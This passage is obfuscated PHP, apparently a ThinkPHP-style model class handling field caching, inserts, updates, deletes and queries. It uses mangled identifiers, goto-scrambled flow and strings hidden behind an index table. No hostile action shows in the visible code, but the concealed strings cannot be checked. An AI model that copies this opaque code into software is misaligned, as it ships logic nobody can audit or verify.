(think_config($b¡–öÛ×ê[229])) { $A°‡¡Í¾³¶ = $this->dbName ? $this->dbName : think_config($b¡–öÛ×ê[230]); $fÄƒ¶¯×í = think_var_cache($b¡–öÛ×ê[231] . strtolower(get_path_this($A°‡¡Í¾³¶) . $b¡–öÛ×ê[91] . $this->name)); if ($fÄƒ¶¯×í) { $fÃ©ÔÄÇ© = think_config($b¡–öÛ×ê[232]); if (empty($fÃ©ÔÄÇ©) || $fÄƒ¶¯×í[$b¡–öÛ×ê[233]] == $fÃ©ÔÄÇ©) { $this->fields = $fÄƒ¶¯×í; return; } } } $this->flush(); } } public function flush() { goto CêË¨ˆğ”; FŒÎŒ§Â×ó: foreach ($A™ö­ÎÂª¬ as $f˜÷‘°ÎœŠ => $e¤‹áˆµ×) { $D§‡Â÷–¨¾[$f˜÷‘°ÎœŠ] = $e¤‹áˆµ×[$aªÍµõ§³°[29]]; if ($e¤‹áˆµ×[$aªÍµõ§³°[36]]) { $this->fields[$aªÍµõ§³°[235]] = $f˜÷‘°ÎœŠ; if ($e¤‹áˆµ×[$aªÍµõ§³°[39]]) { $this->fields[$aªÍµõ§³°[234]] = !0; } } } $this->fields[$aªÍµõ§³°[236]] = $D§‡Â÷–¨¾; if (think_config($aªÍµõ§³°[232])) { $this->fields[$aªÍµõ§³°[233]] = think_config($aªÍµõ§³°[232]); } goto b¯– º ®¥; b¯– º ®¥: if (think_config($aªÍµõ§³°[229])) { $EšÙ·Á½‰« = $this->dbName ? $this->dbName : think_config($aªÍµõ§³°[230]); think_var_cache($aªÍµõ§³°[231] . strtolower(get_path_this($EšÙ·Á½‰«) . $aªÍµõ§³°[91] . $this->name), $this->fields); } goto f’»ª±½Ğñ; C±÷”È§È: if (!$A™ö­ÎÂª¬) { return !1; } $this->fields = array_keys($A™ö­ÎÂª¬); $this->fields[$aªÍµõ§³°[234]] = !1; goto FŒÎŒ§Â×ó; CêË¨ˆğ”: $aªÍµõ§³° =& $_SERVER[Ìó]; $this->db->setModel($this->name); $A™ö­ÎÂª¬ = $this->db->getFields($this->getTableName()); goto C±÷”È§È; f’»ª±½Ğñ: } public function switchModel($FËÊ‚Ôàš, $Eè«„êƒî = array()) { $bØİ¾¸Äãö =& $_SERVER[Ìó]; $d¾ó‘±¡Ğ = ucwords(strtolower($FËÊ‚Ôàš)) . $bØİ¾¸Äãö[237]; if (!class_exists($d¾ó‘±¡Ğ)) { think_exception($d¾ó‘±¡Ğ . think_lang($bØİ¾¸Äãö[238])); } $this->_extModel = new $d¾ó‘±¡Ğ($this->name); if (!empty($Eè«„êƒî)) { foreach ($Eè«„êƒî as $dÓ™½Ë£ÀÓ) { $this->_extModel->setProperty($dÓ™½Ë£ÀÓ, $this->{$dÓ™½Ë£ÀÓ}); } } return $this->_extModel; } public function __set($CÁ‚Š£ªï¾, $B‚íÀÎ©‰¥) { $this->data[$CÁ‚Š£ªï¾] = $B‚íÀÎ©‰¥; } public function __get($fÎ£İ¢ˆà”) { return isset($this->data[$fÎ£İ¢ˆà”]) ? $this->data[$fÎ£İ¢ˆà”] : null; } public function __isset($D£Ş³¯) { return isset($this->data[$D£Ş³¯]); } public function __unset($B¥ÜŠ±‘Èô) { unset($this->data[$B¥ÜŠ±‘Èô]); } public function __call($cçÆ¾¦åù, $f•—ÌÖ‡òí) { $fÍ˜İâ =& $_SERVER[Ìó]; if (in_array(strtolower($cçÆ¾¦åù), $this->methods, !0)) { $this->options[strtolower($cçÆ¾¦åù)] = $f•—ÌÖ‡òí[0]; return $this; } elseif (in_array(strtolower($cçÆ¾¦åù), array($fÍ˜İâ[239], $fÍ˜İâ[240], $fÍ˜İâ[241], $fÍ˜İâ[242], $fÍ˜İâ[243]), !0)) { $Eğá¶¹¶†Ÿ = isset($f•—ÌÖ‡òí[0]) ? $f•—ÌÖ‡òí[0] : $fÍ˜İâ[172]; $Eğá¶¹¶†Ÿ = $this->db->parseKey($Eğá¶¹¶†Ÿ); return $this->getField(strtoupper($cçÆ¾¦åù) . $fÍ˜İâ[244] . $Eğá¶¹¶†Ÿ . $fÍ˜İâ[245] . $cçÆ¾¦åù, $fÍ˜İâ[239]); } elseif (strtolower(substr($cçÆ¾¦åù, 0, 5)) == $fÍ˜İâ[246]) { $Eğá¶¹¶†Ÿ = think_parse_name(substr($cçÆ¾¦åù, 5)); $Cñ¾ÅèÀò®[$Eğá¶¹¶†Ÿ] = $f•—ÌÖ‡òí[0]; return $this->where($Cñ¾ÅèÀò®)->find(); } elseif (strtolower(substr($cçÆ¾¦åù, 0, 10)) == $fÍ˜İâ[247]) { $DùÄ˜°ÔÚ = think_parse_name(substr($cçÆ¾¦åù, 10)); $Cñ¾ÅèÀò®[$DùÄ˜°ÔÚ] = $f•—ÌÖ‡òí[0]; return $this->where($Cñ¾ÅèÀò®)->getField($f•—ÌÖ‡òí[1]); } elseif (isset($this->_scope[$cçÆ¾¦åù])) { return $this->scope($cçÆ¾¦åù, $f•—ÌÖ‡òí[0]); } elseif (method_exists($this, $cçÆ¾¦åù)) { array_unshift($f•—ÌÖ‡òí, $cçÆ¾¦åù); return call_user_func_array(array($this, $fÍ˜İâ[248]), $f•—ÌÖ‡òí); } else { return call_user_func_array(array(parent, $cçÆ¾¦åù), $f•—ÌÖ‡òí); } } protected function call() { goto c¨õ›¨Î•ã; A“®•ÔœİÕ: $bñ´Ê‹‹„‚ = call_user_func_array(array($this, $Aç¿¦²¸­–), $cá‡´¤Ÿé); if (method_exists($this, $cİëè­¤á[252])) { $E¾•éˆÕÜ = call_user_func_array(array($this, $cİëè­¤á[253]), array($D«ßÒº†¿ó, $cá‡´¤Ÿé, $bñ´Ê‹‹„‚)); if ($E¾•éˆÕÜ) { return $E¾•éˆÕÜ; } } return $bñ´Ê‹‹„‚; goto BÈàŒ¥—Î; c˜‘¡¹¯˜ì: $D«ßÒº†¿ó = $Aç¿¦²¸­–; if (is_array($Aç¿¦²¸­–)) { $D«ßÒº†¿ó = $Aç¿¦²¸­–[1]; $Aç¿¦²¸­– = $Aç¿¦²¸­–[0]; } $b–‘Ø¿‘´ö = count($cá‡´¤Ÿé) - 1; goto c„¸æµó; c¨õ›¨Î•ã: $cİëè­¤á =& $_SERVER[Ìó]; $cá‡´¤Ÿé = func_get_args(); $Aç¿¦²¸­– = array_shift($cá‡´¤Ÿé); goto c˜‘¡¹¯˜ì; c„¸æµó: if (isset($cá‡´¤Ÿé[$b–‘Ø¿‘´ö]) && $cá‡´¤Ÿé[$b–‘Ø¿‘´ö] === $Aç¿¦²¸­–) { think_exception(__CLASS__ . $cİëè­¤á[4] . $Aç¿¦²¸­– . think_lang($cİëè­¤á[249])); return; } $cá‡´¤Ÿé[] = $Aç¿¦²¸­–; if (method_exists($this, $cİëè­¤á[250])) { $E¾•éˆÕÜ = call_user_func_array(array($this, $cİëè­¤á[251]), array($D«ßÒº†¿ó, $cá‡´¤Ÿé)); if (!is_null($E¾•éˆÕÜ) && $E¾•éˆÕÜ !== !1) { return $E¾•éˆÕÜ; } } goto A“®•ÔœİÕ; BÈàŒ¥—Î: } protected function _initialize() { } protected function _facade($e¬†ÆÜîÈ’) { $C¾ÇÑæ×Ü =& $_SERVER[Ìó]; if (!empty($this->fields)) { foreach ($e¬†ÆÜîÈ’ as $D½‚ƒÆî˜À => $D©¬Œ…„“) { if (!in_array($D½‚ƒÆî˜À, $this->fields, !0)) { unset($e¬†ÆÜîÈ’[$D½‚ƒÆî˜À]); } elseif (is_scalar($D©¬Œ…„“)) { $this->_parseType($e¬†ÆÜîÈ’, $D½‚ƒÆî˜À); } } } if (!empty($this->options[$C¾ÇÑæ×Ü[254]])) { $e¬†ÆÜîÈ’ = array_map($this->options[$C¾ÇÑæ×Ü[254]], $e¬†ÆÜîÈ’); unset($this->options[$C¾ÇÑæ×Ü[254]]); } $this->_beforeWrite($e¬†ÆÜîÈ’); return $e¬†ÆÜîÈ’; } protected function _beforeWrite(&$eëùíÉÇší) { } public function add($Dù“àÈÂÊ = '', $CŞÊÌÆò£† = array(), $C«ÒƒõòÀğ = false) { goto A“…‡Èñ˜; A“…‡Èñ˜: if (empty($Dù“àÈÂÊ)) { if (!empty($this->data)) { $Dù“àÈÂÊ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ìó][255]); return !1; } } $CŞÊÌÆò£† = $this->_parseOptions($CŞÊÌÆò£†); $Dù“àÈÂÊ = $this->_facade($Dù“àÈÂÊ); goto B°‡Àš÷êƒ; DÛ‹»ÚãÆ‹: return $d‚šÎ›±Ñ; goto aÄ–òµ¸‡”; B°‡Àš÷êƒ: if (!1 === $this->_beforeInsert($Dù“àÈÂÊ, $CŞÊÌÆò£†)) { return !1; } $d‚šÎ›±Ñ = $this->db->insert($Dù“àÈÂÊ, $CŞÊÌÆò£†, $C«ÒƒõòÀğ); if (!1 !== $d‚šÎ›±Ñ) { $CÃïƒñå·¿ = $this->getLastInsID(); if ($CÃïƒñå·¿) { $Dù“àÈÂÊ[$this->getPk()] = $CÃïƒñå·¿; $this->_after_insert($Dù“àÈÂÊ, $CŞÊÌÆò£†); return $CÃïƒñå·¿; } $this->_after_insert($Dù“àÈÂÊ, $CŞÊÌÆò£†); } goto DÛ‹»ÚãÆ‹; aÄ–òµ¸‡”: } protected function _beforeInsert(&$c¨†ë–Ğ, $E±í³‡áÆñ) { } protected function _after_insert($eÀóíÊŞ¨Ê, $Aˆ˜¿µø’) { } public function addAll($eàö˜®ó¹, $fœ…š‚ó­õ = array(), $B¤ŒÃÕ” = false) { goto dãì˜”Ø°; b¤•â²ßË: return $F¾Áİ¦ÏÏ¯; goto dÑ™¨½¿†‹; cµëÄïŠ : foreach ($eàö˜®ó¹ as $dõ„Š¤ÍŒÓ => $Fì»²¤‡¸æ) { $eàö˜®ó¹[$dõ„Š¤ÍŒÓ] = $this->_facade($Fì»²¤‡¸æ); } if (method_exists($this->db, $E÷†¡—»[256])) { $F¾Áİ¦ÏÏ¯ = $this->db->insertAll($eàö˜®ó¹, $fœ…š‚ó­õ, $B¤ŒÃÕ”); } else { $this->startTrans(); foreach ($eàö˜®ó¹ as $dõ„Š¤ÍŒÓ => $Fì»²¤‡¸æ) { $F¾Áİ¦ÏÏ¯ = $this->db->insert($Fì»²¤‡¸æ, $fœ…š‚ó­õ, $B¤ŒÃÕ”); } $this->commit(); } if (!1 !== $F¾Áİ¦ÏÏ¯) { $FĞâ…‹”ï = $this->getLastInsID(); if ($FĞâ…‹”ï) { return $FĞâ…‹”ï; } } goto b¤•â²ßË; dãì˜”Ø°: $E÷†¡—» =& $_SERVER[Ìó]; if (empty($eàö˜®ó¹)) { $this->error = think_lang($E÷†¡—»[255]); return !1; } $fœ…š‚ó­õ = $this->_parseOptions($fœ…š‚ó­õ); goto cµëÄïŠ ; dÑ™¨½¿†‹: } public function selectAdd($Aïè†äíßù = '', $A·È‰§ñÀŞ = '', $A½Ñ’¬› = array()) { $D”ÃªŠİˆ =& $_SERVER[Ìó]; $A½Ñ’¬› = $this->_parseOptions($A½Ñ’¬›); if (!1 === ($Eõ·–Ü¯¥ = $this->db->selectInsert($Aïè†äíßù ? $Aïè†äíßù : $A½Ñ’¬›[$D”ÃªŠİˆ[257]], $A·È‰§ñÀŞ ? $A·È‰§ñÀŞ : $this->getTableName(), $A½Ñ’¬›))) { $this->error = think_lang($D”ÃªŠİˆ[258]); return !1; } else { return $Eõ·–Ü¯¥; } } public function save($fŒñ»Ş‡“ = '', $fÄµÚä¦·¯ = array()) { goto CÜ¢Àë‚‘‚; CÓ÷õ¼“–°: if (is_array($fÄµÚä¦·¯[$EÜ²ƒìÓÊò[259]]) && isset($fÄµÚä¦·¯[$EÜ²ƒìÓÊò[259]][$dÙÃ«İÌƒŸ])) { $d‡ùÓÓæ‡Ì = $fÄµÚä¦·¯[$EÜ²ƒìÓÊò[259]][$dÙÃ«İÌƒŸ]; } if (!1 === $this->_beforeUpdate($fŒñ»Ş‡“, $fÄµÚä¦·¯)) { return !1; } $Fˆ©Ïø¡³‡ = $this->db->update($fŒñ»Ş‡“, $fÄµÚä¦·¯); goto fâÏ˜‘Ö·‚; CÜ¢Àë‚‘‚: $EÜ²ƒìÓÊò =& $_SERVER[Ìó]; if (empty($fŒñ»Ş‡“)) { if (!empty($this->data)) { $fŒñ»Ş‡“ = $this->data; $this->data = array(); } else { $this->error = think_lang($EÜ²ƒìÓÊò[255]); return !1; } } $fŒñ»Ş‡“ = $this->_facade($fŒñ»Ş‡“); goto FÌÏòÌ÷”; fâÏ˜‘Ö·‚: if (!1 !== $Fˆ©Ïø¡³‡) { if (isset($d‡ùÓÓæ‡Ì)) { $fŒñ»Ş‡“[$dÙÃ«İÌƒŸ] = $d‡ùÓÓæ‡Ì; } $this->_afterUpdate($fŒñ»Ş‡“, $fÄµÚä¦·¯); } return $Fˆ©Ïø¡³‡; goto d¥¥ÑŒøï; FÌÏòÌ÷”: $fÄµÚä¦·¯ = $this->_parseOptions($fÄµÚä¦·¯); $dÙÃ«İÌƒŸ = $this->getPk(); if (!isset($fÄµÚä¦·¯[$EÜ²ƒìÓÊò[259]])) { if (isset($fŒñ»Ş‡“[$dÙÃ«İÌƒŸ])) { $dØô…áƒ§[$dÙÃ«İÌƒŸ] = $fŒñ»Ş‡“[$dÙÃ«İÌƒŸ]; $fÄµÚä¦·¯[$EÜ²ƒìÓÊò[259]] = $dØô…áƒ§; unset($fŒñ»Ş‡“[$dÙÃ«İÌƒŸ]); } else { $this->error = think_lang($EÜ²ƒìÓÊò[258]); return !1; } } goto CÓ÷õ¼“–°; d¥¥ÑŒøï: } protected function _beforeUpdate(&$AÉÑĞšÛâİ, $f§¤‰Ñà¤ˆ) { } protected function _afterUpdate($D²ºŠ¢ÙËŸ, $CµôŞÙ›) { } public function delete($c¬”œÃÁ‡† = array()) { goto E»åùà®; E»åùà®: $d«’—È‹©„ =& $_SERVER[Ìó]; if (empty($c¬”œÃÁ‡†) && empty($this->options[$d«’—È‹©„[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dˆ±¥òĞ›° = $this->getPk(); goto dğöµ‘Í† ; dğöµ‘Í† : if (is_numeric($c¬”œÃÁ‡†) || is_string($c¬”œÃÁ‡†)) { if (strpos($c¬”œÃÁ‡†, $d«’—È‹©„[47])) { $cŠ¬¦Ù¹ñ[$dˆ±¥òĞ›°] = array($d«’—È‹©„[260], $c¬”œÃÁ‡†); } else { $cŠ¬¦Ù¹ñ[$dˆ±¥òĞ›°] = $c¬”œÃÁ‡†; } $this->options[$d«’—È‹©„[259]] = $cŠ¬¦Ù¹ñ; } $c¬”œÃÁ‡† = $this->_parseOptions(); if (is_array($c¬”œÃÁ‡†[$d«’—È‹©„[259]]) && isset($c¬”œÃÁ‡†[$d«’—È‹©„[259]][$dˆ±¥òĞ›°])) { $E†È÷Şº“Ô = $c¬”œÃÁ‡†[$d«’—È‹©„[259]][$dˆ±¥òĞ›°]; } goto fÎâåŠù®î; fÎâåŠù®î: $Däâëø¯íè = $this->db->delete($c¬”œÃÁ‡†); if (!1 !== $Däâëø¯íè) { $DÈÇöÈóŠâ = array(); if (isset($E†È÷Şº“Ô)) { $DÈÇöÈóŠâ[$dˆ±¥òĞ›°] = $E†È÷Şº“Ô; } $this->_after_delete($DÈÇöÈóŠâ, $c¬”œÃÁ‡†); } return $Däâëø¯íè; goto fµ®ÂÉïŸ­; fµ®ÂÉïŸ­: } protected function _after_delete($d«”ˆãµ­ê, $bÄÇË¤¨è) { } public function select($B¿‚±…–¯¼ = array()) { goto E»®’‰Üòá; B¹•…°Œ„: $eÄ‡ì–àİª = $this->db->select($B¿‚±…–¯¼); if (!1 === $eÄ‡ì–àİª) { return !1; } if (empty($eÄ‡ì–àİª)) { return null; } goto B„¹„Íá; E»®’‰Üòá: $c´¯–¦àí´ =& $_SERVER[Ìó]; if (is_string($B¿‚±…–¯¼) || is_numeric($B¿‚±…–¯¼)) { $eßĞ”Ğ±­ê = $this->getPk(); if (strpos($B¿‚±…–¯¼, $c´¯–¦àí´[47])) { $Cì²–èéÒÏ[$eßĞ”Ğ±­ê] = array($c´¯–¦àí´[260], $B¿‚±…–¯¼); } else { $Cì²–èéÒÏ[$eßĞ”Ğ±­ê] = $B¿‚±…–¯¼; } $this->options[$c´¯–¦àí´[259]] = $Cì²–èéÒÏ; } elseif (!1 === $B¿‚±…–¯¼) { $B¿‚±…–¯¼ = $this->_parseOptions(); return $c´¯–¦àí´[261] . $this->db->buildSelectSql($B¿‚±…–¯¼) . $c´¯–¦àí´[262]; } $B¿‚±…–¯¼ = $this->_parseOptions(); goto B¹•…°Œ„; B„¹„Íá: $this->_afterSelect($eÄ‡ì–àİª, $B¿‚±…–¯¼); return $eÄ‡ì–àİª; goto Dê…×Ò¿; Dê…×Ò¿: } protected function _afterSelect(&$F´¿æ¶ó, $cìãºŞ‚êç) { } public function buildSql($fÁùÜ”¸ = array()) { $e‰»×Ä´÷¬ =& $_SERVER[Ìó]; $fÁùÜ”¸ = $this->_parseOptions($fÁùÜ”¸); return $e‰»×Ä´÷¬[261] . $this->db->buildSelectSql($fÁùÜ”¸) . $e‰»×Ä´÷¬[262]; } public function optionsValue($cêãÏé¼£» = null) { if (is_null($cêãÏé¼£»)) { return $this->options; } elseif (is_array($cêãÏé¼£»)) { $this->options = array_merge($this->options, $cêãÏé¼£»); } } protected function _parseOptions($A‹–¾µÆ¦  = array()) { goto fºÖİôİ—; d¸‘êï×‰”: if (!isset($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[263]])) { $A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[263]] = $this->getTableName(); $Cæ‰å¯ºã = $this->fields; } else { $Cæ‰å¯ºã = $this->getDbFields(); } if (!empty($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[264]])) { $A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[263]] .= $aõÈ¯ÁÃ‘Ø[50] . $A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[264]]; } $A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[265]] = $this->name; goto cÓŒÚª¿’³; cÓŒÚª¿’³: if (isset($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[259]]) && is_array($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[259]]) && !empty($Cæ‰å¯ºã) && !isset($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[266]]) && !isset($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[263]])) { foreach ($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[259]] as $A’å’ÃÖ£Ê => $F£È••Ô³‹) { $A’å’ÃÖ£Ê = trim($A’å’ÃÖ£Ê); if (in_array($A’å’ÃÖ£Ê, $Cæ‰å¯ºã, !0)) { if (is_scalar($F£È••Ô³‹)) { $this->_parseType($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[259]], $A’å’ÃÖ£Ê); } } elseif (!is_numeric($A’å’ÃÖ£Ê) && $aõÈ¯ÁÃ‘Ø[70] != substr($A’å’ÃÖ£Ê, 0, 1) && !1 === strpos($A’å’ÃÖ£Ê, $aõÈ¯ÁÃ‘Ø[91]) && !1 === strpos($A’å’ÃÖ£Ê, $aõÈ¯ÁÃ‘Ø[244]) && !1 === strpos($A’å’ÃÖ£Ê, $aõÈ¯ÁÃ‘Ø[267]) && !1 === strpos($A’å’ÃÖ£Ê, $aõÈ¯ÁÃ‘Ø[268])) { unset($A‹–¾µÆ¦ [$aõÈ¯ÁÃ‘Ø[259]][$A’å’ÃÖ£Ê]); } } } $this->_options_filter($A‹–¾µÆ¦ ); return $A‹–¾µÆ¦ ; goto C®â¥æŒ´; fºÖİôİ—: $aõÈ¯ÁÃ‘Ø =& $_SERVER[Ìó]; if (is_array($A‹–¾µÆ¦ )) { $A‹–¾µÆ¦  = array_merge($this->options, $A‹–¾µÆ¦ ); } $this->options = array(); goto d¸‘êï×‰”; C®â¥æŒ´: } protected function _options_filter(&$EÆ¹ÚËÖÉ) { } protected function _parseType(&$Cˆ‡«®é‚, $B‘ô¿™Åí) { $CšÌ¥’ê—× =& $_SERVER[Ìó]; if (empty($this->options[$CšÌ¥’ê—×[269]][$CšÌ¥’ê—×[4] . $B‘ô¿™Åí])) { $fƒŸê›ãÊª = strtolower($this->fields[$CšÌ¥’ê—×[236]][$B‘ô¿™Åí]); if (!1 !== strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[270])) { } elseif (!1 === strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[271]) && !1 !== strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[272])) { $Cˆ‡«®é‚[$B‘ô¿™Åí] = intval($Cˆ‡«®é‚[$B‘ô¿™Åí]); } elseif (!1 !== strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[273]) || !1 !== strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[274])) { $Cˆ‡«®é‚[$B‘ô¿™Åí] = floatval($Cˆ‡«®é‚[$B‘ô¿™Åí]); } elseif (!1 !== strpos($fƒŸê›ãÊª, $CšÌ¥’ê—×[275])) { $Cˆ‡«®é‚[$B‘ô¿™Åí] = (bool) $Cˆ‡«®é‚[$B‘ô¿™Åí]; } } } public function find($FõñŒš• = array()) { goto fåôËÖ†—Ó; e´•¯±İéÊ: if (!empty($this->options[$BŞáİªÑÜô[277]])) { return $this->returnResult($this->data, $this->options[$BŞáİªÑÜô[277]]); } return $this->data; goto d——ŠÂ½¨©; A“Ù¾Óƒ¬½: if (empty($cê¼³»Ê¡‘)) { return null; } $this->data = $cê¼³»Ê¡‘[0]; $this->_afterFind($this->data, $FõñŒš•); goto e´•¯±İéÊ; B¿°ÈÓ—·: $FõñŒš• = $this->_parseOptions(); $cê¼³»Ê¡‘ = $this->db->select($FõñŒš•); if (!1 === $cê¼³»Ê¡‘) { return !1; } goto A“Ù¾Óƒ¬½; fåôËÖ†—Ó: $BŞáİªÑÜô =& $_SERVER[Ìó]; if (is_numeric($FõñŒš•) || is_string($FõñŒš•)) { $b”›òÛ²Œ‚[$this->getPk()] = intval($FõñŒš•); $this->options[$BŞáİªÑÜô[259]] = $b”›òÛ²Œ‚; } $this->options[$BŞáİªÑÜô[276]] = 1; goto B¿°ÈÓ—·; d——ŠÂ½¨©: } protected function _afterFind(&$cŸç‘äë±, $B¾ƒºåŸÑ•) { } protected function returnResult($B¦¦òŒÊŞÖ, $AèÙÀÕ‹í‹ = '') { $b©‚Ÿ÷åĞ— =& $_SERVER[Ìó]; if ($AèÙÀÕ‹í‹) { if (is_callable($AèÙÀÕ‹í‹)) { return call_user_func($AèÙÀÕ‹í‹, $B¦¦òŒÊŞÖ); } switch (strtolower($AèÙÀÕ‹í‹)) { case $b©‚Ÿ÷åĞ—[278]: return json_encode($B¦¦òŒÊŞÖ); case $b©‚Ÿ÷åĞ—[279]: return xml_encode($B¦¦òŒÊŞÖ); } } return $B¦¦òŒÊŞÖ; } public function parseFieldsMap($aò ²Ì£´ï, $Cˆ¯Ö¿àŞè = 1) { if (!empty($this->_map)) { foreach ($this->_map as $D†Ææ‹’ß => $B„œ‘ñÌ…±) { if ($Cˆ¯Ö¿àŞè == 1) { if (isset($aò ²Ì£´ï[$B„œ‘ñÌ…±])) { $aò ²Ì£´ï[$D†Ææ‹’ß] = $aò ²Ì£´ï[$B„œ‘ñÌ…±]; unset($aò ²Ì£´ï[$B„œ‘ñÌ…±]); } } else { if (isset($aò ²Ì£´ï[$D†Ææ‹’ß])) { $aò ²Ì£´ï[$B„œ‘ñÌ…±] = $aò ²Ì£´ï[$D†Ææ‹’ß]; unset($aò ²Ì£´ï[$D†Ææ‹’ß]); } } } } return $aò ²Ì£´ï; } public function setField($B’©ïĞùª, $CÄŒùóÜ£ğ = '') { if (is_array($B’©ïĞùª)) { $cîö‹ó Æ™ = $B’©ïĞùª; } else { $cîö‹ó Æ™[$B’©ïĞùª] = $CÄŒùóÜ£ğ; } return $this->save($cîö‹ó Æ™); } public function setAdd($B±¦„ƒÈ, $BéÀÎ§Š‚× = 1) { $aéÎÈŒ°÷‡ =& $_SERVER[Ìó]; $EÏÈ§åóŠ› = $B±¦„ƒÈ . $aéÎÈŒ°÷‡[280] . $BéÀÎ§Š‚×; if ($BéÀÎ§Š‚× < 0) { $EÏÈ§åóŠ› = $B±¦„ƒÈ . $BéÀÎ§Š‚×; } return $this->setField($B±¦„ƒÈ, array($aéÎÈŒ°÷‡[281], $EÏÈ§åóŠ›)); } public function getField($CùŒ¿…×, $e«¾ÛÙ·¶Ò = null) { $bùÁ„ì… =& $_SERVER[Ìó]; $a£ˆÒ„Š¢[$bùÁ„ì…[257]] = $CùŒ¿…×; $a£ˆÒ„Š¢ = $this->_parseOptions($a£ˆÒ„Š¢); $CùŒ¿…× = trim($CùŒ¿…×); if (strpos($CùŒ¿…×, $bùÁ„ì…[47])) { if (!isset($a£ˆÒ„Š¢[$bùÁ„ì…[276]])) { $a£ˆÒ„Š¢[$bùÁ„ì…[276]] = is_numeric($e«¾ÛÙ·¶Ò) ? $e«¾ÛÙ·¶Ò : $bùÁ„ì…[33]; } $Dƒ¾ê„¹†¬ = $this->db->select($a£ˆÒ„Š¢); if (!empty($Dƒ¾ê„¹†¬)) { goto DœˆÄ¿é¦¾; AğøˆïÅ˜‘: $CÛÃ½àÙ‡Ë = array_shift($CùŒ¿…×); $b„“ò×° = array(); $bğÄÔœé¡ = count($C›ôÊ¨ø†°); goto FòĞ½ïÁ; FòĞ½ïÁ: foreach ($Dƒ¾ê„¹†¬ as $aŒóç…ºßè) { $aùŸ…Å¬ÃÑ = $aŒóç…ºßè[$AĞõšÃ°]; if (2 == $bğÄÔœé¡) { $b„“ò×°[$aùŸ…Å¬ÃÑ] = $aŒóç…ºßè[$CÛÃ½àÙ‡Ë]; } else { $b„“ò×°[$aùŸ…Å¬ÃÑ] = is_string($e«¾ÛÙ·¶Ò) ? implode($e«¾ÛÙ·¶Ò, $aŒóç…ºßè) : $aŒóç…ºßè; } } return $b„“ò×°; goto Fà­ëòöÔ•; DœˆÄ¿é¦¾: $C›ôÊ¨ø†° = explode($bùÁ„ì…[47], $CùŒ¿…×); $CùŒ¿…× = array_keys($Dƒ¾ê„¹†¬[0]); $AĞõšÃ° = array_shift($CùŒ¿…×); goto AğøˆïÅ˜‘; Fà­ëòöÔ•: } } else { if (!0 !== $e«¾ÛÙ·¶Ò) { $a£ˆÒ„Š¢[$bùÁ„ì…[276]] = is_numeric($e«¾ÛÙ·¶Ò) ? $e«¾ÛÙ·¶Ò : 1; } if ($e«¾ÛÙ·¶Ò === $bùÁ„ì…[239]) { unset($a£ˆÒ„Š¢[$bùÁ„ì…[276]]); } $aŒóç…ºßè = $this->db->select($a£ˆÒ„Š¢); if (!empty($aŒóç…ºßè)) { if ($e«¾ÛÙ·¶Ò === $bùÁ„ì…[239]) { return reset($aŒóç…ºßè[0]); } if (!0 !== $e«¾ÛÙ·¶Ò && 1 == $a£ˆÒ„Š¢[$bùÁ„ì…[276]]) { return reset($aŒóç…ºßè[0]); } foreach ($aŒóç…ºßè as $cÔÑƒéˆ•) { $B•¡À–·[] = $cÔÑƒéˆ•[$CùŒ¿…×]; } return $B•¡À–·; } } return null; } public function create($B¯ÓÆ‡ƒ¨¾ = '', $e™Ñ‹ˆ¿Ìù = '') { goto c±ÈÑƒªÜŞ; EÌ×‚ÇÏ“ˆ: if (isset($E™‹çè×Ê˜)) { if (is_string($E™‹çè×Ê˜)) { $E™‹çè×Ê˜ = explode($Dë½ë©Ø•—[47], $E™‹çè×Ê˜); } if (think_config($Dë½ë©Ø•—[282])) { $E™‹çè×Ê˜[] = think_config($Dë½ë©Ø•—[283]); } foreach ($B¯ÓÆ‡ƒ¨¾ as $eîè¦°İĞØ => $d©½äèÕĞ) { if (!in_array($eîè¦°İĞØ, $E™‹çè×Ê˜)) { unset($B¯ÓÆ‡ƒ¨¾[$eîè¦°İĞØ]); } } } if (!$this->autoValidation($B¯ÓÆ‡ƒ¨¾, $e™Ñ‹ˆ¿Ìù)) { return !1; } if (!$this->autoCheckToken($B¯ÓÆ‡ƒ¨¾)) { $this->error = think_lang($Dë½ë©Ø•—[284]); return !1; } goto b›†¥¬İ‹; b›†¥¬İ‹: if ($this->autoCheckFields) { $E™‹çè×Ê˜ = $this->getDbFields(); foreach ($B¯ÓÆ‡ƒ¨¾ as $eîè¦°İĞØ => $d©½äèÕĞ) { if (!in_array($eîè¦°İĞØ, $E™‹çè×Ê˜)) { unset($B¯ÓÆ‡ƒ¨¾[$eîè¦°İĞØ]); } elseif (MAGIC_QUOTES_GPC && is_string($d©½äèÕĞ)) { $B¯ÓÆ‡ƒ¨¾[$eîè¦°İĞØ] = stripslashes($d©½äèÕĞ); } } } $this->autoOperation($B¯ÓÆ‡ƒ¨¾, $e™Ñ‹ˆ¿Ìù); $this->data = $B¯ÓÆ‡ƒ¨¾; goto D¯Ë˜¢â´Ğ; D¯Ë˜¢â´Ğ: return $B¯ÓÆ‡ƒ¨¾; goto dÒéò’‘ŸÂ; c±ÈÑƒªÜŞ: $Dë½ë©Ø•— =& $_SERVER[Ìó]; if (empty($B¯ÓÆ‡ƒ¨¾)) { $B¯ÓÆ‡ƒ¨¾ = $_POST; } elseif (is_object($B¯ÓÆ‡ƒ¨¾)) { $B¯ÓÆ‡ƒ¨¾ = get_object_vars($B¯ÓÆ‡ƒ¨¾); } if (empty($B¯ÓÆ‡ƒ¨¾) || !is_array($B¯ÓÆ‡ƒ¨¾)) { $this->error = think_lang($Dë½ë©Ø•—[255]); return !1; } goto 